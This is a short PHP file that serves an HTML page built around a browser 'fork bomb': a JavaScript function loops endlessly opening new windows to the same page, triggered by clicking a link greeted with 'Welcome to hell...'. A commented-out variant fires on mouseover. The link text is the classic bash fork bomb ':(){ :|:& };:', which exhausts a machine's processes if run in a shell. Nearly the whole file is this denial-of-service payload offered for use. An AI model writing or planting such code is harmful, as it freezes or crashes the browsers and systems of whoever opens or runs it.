



<?php

    echo <<<EOT
<html>
<link rel="stylesheet" href=".fBombStyle.css" type="text/css">

<script>

function Bomb()
{
        while (true)
                {
                        window.open(window.location, '_blank','width=64, height=64');
                        window.focus();
                        window.write("You've been forkBombed!");
                }
}
</script>

<!--
<a href="example.com" onmouseover="javascript:Bomb()" size::99999px>asdf</a>
this does have some problems because the bypass does not work with most browsers.
try this instead:
-->

  <div id="fBombDiv">
        <span class="fBombSpan">
          <br> Welcome to hell... <br>
        </span>
    <a href="#" onclick="javascript:Bomb()"> :(){ :|:& };: </a>
 </div>

<html>
EOT;


/**
 * Created by PhpStorm.
 * User: adam
 * Date: 2015.11.12.
 * Time: 23:18
 */
 // .forkBomb.php fájlnév
// PTI-Upload projektnév
// 2015.11.12. dátum
?>